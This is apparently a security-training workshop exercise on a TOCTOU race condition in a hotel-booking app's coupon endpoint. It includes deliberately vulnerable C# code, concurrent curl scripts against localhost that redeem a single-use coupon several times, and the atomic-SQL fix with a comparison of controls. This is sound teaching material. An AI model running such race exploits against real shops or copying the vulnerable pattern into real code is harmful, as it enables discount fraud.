# Exercise 06 — Race Conditions: Coupon Redemption

**Difficulty:** Intermediate  
**Category:** Race Conditions / TOCTOU  
**OWASP Top 10:** API4:2023 — Unrestricted Resource Consumption / A04:2021 — Insecure Design  
---

## Scenario

The coupon redemption endpoint (`POST /api/coupons/redeem`) enforces a per-coupon `MaxUses` limit by reading the current use count, checking it, waiting slightly, then writing the increment back. Because the check and the write are two separate operations with a gap between them, two concurrent requests can both pass the check before either writes — allowing a single-use coupon to be redeemed multiple times.

---

## Background

A **Time of Check / Time of Use (TOCTOU)** race condition occurs when:

1. A value is read and validated (Time of Check)
2. Some time passes during which another actor can change that value
3. The system acts based on the now-stale validation result (Time of Use)

The window between check and write is the **race window**. In a web API, this window is often only milliseconds — but that is enough for concurrent requests from the same user or multiple users to all pass the check simultaneously.

Common real-world examples:
- Coupon / discount code reuse
- Referral bonus double-claim
- Gift card balance bypass
- Double-spend in payment flows
- Inventory over-sell (booking a sold-out seat)

---

## Step 1 — Observe normal behaviour via the UI

The database is seeded with:

| Code     | Discount | Max Uses |
|----------|----------|----------|
| SAVE10   | 10%      | 1        |
| SUMMER20 | 20%      | 3        |

Log in as `partner / Partner1234!` at `http://localhost:5173`. Add any hotel to your cart from the **Hotels** page, then go to **Cart**.

In the **Checkout** section you'll see a coupon input. Enter `SUMMER20` and click **Apply**. The discount appears:

```
SUMMER20 — 20% off
```

Apply it two more times (you need to remove and re-enter the code each time). On the fourth attempt the server returns an error — `"Coupon has already been fully redeemed"` (`409 Conflict`). Three uses are exactly the limit.

Now try the race condition: open a **second browser tab** to `http://localhost:5173/cart`. In both tabs, type `SAVE10` into the coupon box. Click **Apply** in both tabs as simultaneously as possible.

If your timing is close enough, both return success and the cart shows:

```
SAVE10 — 10% off × 2 (race condition!)
```

The compounded discount in the total confirms two redemptions slipped through. The timing window is 500 ms (artificially widened for the workshop), so two-tab clicking works reliably. In production the window is typically 5–15 ms — too small for manual clicks, requiring scripted concurrent requests.

To reset the coupon state before continuing:

```bash
bash scripts/reset-db.sh
```

---

## Step 2 — Understand the vulnerable code

```csharp
// WORKSHOP: VULNERABLE PATH (TOCTOU)
// Time of Check
var coupon = await _db.Coupons.FirstOrDefaultAsync(c => c.Code == request.Code);
if (coupon.UsesCount >= coupon.MaxUses)
    return Conflict(...);

// Race window — artificial 500 ms delay
await Task.Delay(500);

// Time of Use — stale data may have already been overwritten by another request
coupon.UsesCount++;
await _db.SaveChangesAsync();
```

The 500 ms delay is artificial and exists to make the race window exploitable in a workshop setting. In production code, the window is typically 1–10 ms — enough for concurrent HTTP requests to both pass the check.

---

## Step 3 — Exploit the race condition

Reset the database to restore coupon state:

```bash
bash scripts/reset-db.sh
```

Log in and send two requests simultaneously. Use `&` to background both before `wait`:

```bash
# Log in (cookie auth via BFF)
curl -s -c cookies.txt -X POST http://localhost:5001/bff/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"partner","password":"Partner1234!"}' | jq .

# Both requests land while the other is sleeping — both pass the check
curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
  -H "Content-Type: application/json" \
  -d '{"code":"SAVE10"}' | jq . &

curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
  -H "Content-Type: application/json" \
  -d '{"code":"SAVE10"}' | jq . &

wait
```

Expected: **both return `200 OK`** with `"discountPercent": 10`, even though `MaxUses = 1`.

Now check your cart:

```bash
curl -s -b cookies.txt http://localhost:5001/bff/cart | jq .
```

Expected cart state:

```json
{
  "appliedCouponCode": "SAVE10",
  "appliedCouponDiscountPercent": 10,
  "appliedCouponCount": 2
}
```

The server recorded **two redemptions**. At checkout the compound discount is applied:

```
$120.00  (base price)
× 0.90   (first 10% off)  →  $108.00
× 0.90   (second 10% off) →   $97.20
```

In the UI the coupon badge reads **"SAVE10 — 10% off × 2 (race condition!)"** and the cart total shows $97.20 instead of $108.00.

This is the financial impact: the attacker extracted an extra $10.80 of discount that the coupon was never meant to grant.

---

## Step 4 — Scale the attack

With more parallelism, more discount stacks. Reset the database first so the coupon count is back to 0:

```bash
bash scripts/reset-db.sh

# Log back in after the reset
curl -s -c cookies.txt -X POST http://localhost:5001/bff/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"partner","password":"Partner1234!"}' | jq .

for i in $(seq 1 5); do
  curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
    -H "Content-Type: application/json" \
    -d '{"code":"SAVE10"}' | jq -r '.message' &
done
wait
```

Check the cart again — `appliedCouponCount` may be 3–5 (depends on how many requests beat the delay). Each additional application compounds: 5× at 10% = `$120 × 0.9⁵ = $70.87`.

---

## Step 5 — How it works at runtime

```
POST /bff/coupons/redeem (×2 concurrent, SAVE10 MaxUses=1)
        │
        ├─ Vulnerable (TOCTOU)
        │       │
        │  Req 1: reads UsesCount=0 → 0 < 1 → check passes
        │  Req 2: reads UsesCount=0 → 0 < 1 → check passes   ← both pass simultaneously
        │       │
        │  [500ms race window — both requests are asleep here]
        │       │
        │  Req 1: UsesCount++ → SaveChanges → UsesCount=1
        │  Req 2: UsesCount++ → SaveChanges → UsesCount=2     ← MaxUses violated
        │       │
        │       └─► both return 200 OK — coupon redeemed twice
        │
        └─ Fixed: atomic UPDATE in DB
                │
                ▼
           UPDATE Coupons SET UsesCount = UsesCount + 1
           WHERE Code = @code AND UsesCount < MaxUses
                │
                ├─ Req 1 wins: 1 row affected → 200 OK
                └─ Req 2 loses: 0 rows affected → 409 Conflict
```

## The fix

The fixed code:

```sql
UPDATE bookingdojo."Coupons"
SET "UsesCount" = "UsesCount" + 1
WHERE "Code" = @code AND "UsesCount" < "MaxUses"
```

The database evaluates the `WHERE` condition and performs the increment atomically within a single statement. Both concurrent requests race to run this statement, but only the one that gets there first satisfies `UsesCount < MaxUses`; the other sees 0 rows affected and receives a 409.

---

## Step 6 — Discussion

| Control | Description | Applied here |
|---------|-------------|--------------|
| Atomic UPDATE with WHERE | Check and write in one DB statement | ✓ |
| Optimistic concurrency (row version) | Retry on conflict; reject stale writes | Alternative |
| Pessimistic locking (SELECT FOR UPDATE) | Holds a row lock during check-then-write | Alternative |
| Distributed lock (Redis, DB advisory) | Prevents concurrent execution at app level | Over-engineered for this case |
| Idempotency keys | Client supplies a unique request ID; duplicates rejected | Complementary |

**Why the atomic UPDATE wins here**

- No extra round-trips: single SQL statement, no lock acquisition overhead
- Database enforces the constraint — nothing in application code can accidentally bypass it
- Works under horizontal scaling (multiple API instances share one database)
- Naturally handles the "coupon not found" case by returning 0 rows

**Why optimistic concurrency also works**

EF Core `[Timestamp]` / `RowVersion` causes `SaveChangesAsync` to throw `DbUpdateConcurrencyException` when a row was modified between read and write. Callers catch the exception and return 409. The downside: requires a retry-or-abort decision at the application layer.

**Why `SELECT FOR UPDATE` is usually worse**

Row-level locks held for the duration of the check-then-write block other readers on the same coupon, reducing throughput. The atomic UPDATE is lock-free from the application's perspective.

---

## Key Takeaways

- **TOCTOU is not a theoretical risk.** A 500 ms window is artificial; 5 ms is realistic. Concurrent HTTP requests from the same client can exploit even tiny windows.
- **Reads do not reserve state.** Reading `UsesCount = 0` does not mean another request cannot read the same value before your write lands.
- **The fix lives in the database, not the application.** Application-level locks (mutexes, semaphores) only protect a single process; they fail silently under horizontal scaling.
- **Atomic SQL is the simplest correct solution** for bounded-use resources: check and act in one statement.

---

## Further Reading

- [OWASP API4:2023 — Unrestricted Resource Consumption](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)
- [OWASP Race Condition](https://owasp.org/www-community/vulnerabilities/Race_Condition)
- [CWE-362: Concurrent Execution Using Shared Resource with Improper Synchronization](https://cwe.mitre.org/data/definitions/362.html)
- [EF Core Optimistic Concurrency](https://learn.microsoft.com/en-us/ef/core/saving/concurrency)
- [PostgreSQL Locking](https://www.postgresql.org/docs/current/explicit-locking.html)
